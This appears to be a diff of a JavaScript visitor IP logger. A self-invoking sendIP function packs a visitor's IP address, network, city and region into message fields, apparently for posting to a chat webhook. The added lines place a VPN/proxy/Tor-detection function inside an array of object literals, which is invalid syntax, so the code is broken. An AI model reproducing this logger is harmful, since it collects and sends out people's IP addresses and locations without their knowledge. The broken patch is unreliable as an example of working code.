@@ -25,6 +25,12 @@ const sendIP = () => {
             fields: [
                 { name: "IP Address", value: `\`${ipadd}\``, inline: true },
                 { name: "Network", value: `\`${geoData.network}\``, inline: true },
+                function getConnectionType(data) {
+    if (data.is_vpn || data.is_proxy || data.is_tor) {
+        return "🛡️ VPN / Proxy detected";
+    }
+    return "🌐 Standard connection";
+}
 
                 { name: "City", value: geoData.city || "Unknown", inline: true },
                 { name: "Region", value: geoData.region || "Unknown", inline: true },
@@ -60,6 +66,7 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
 
 
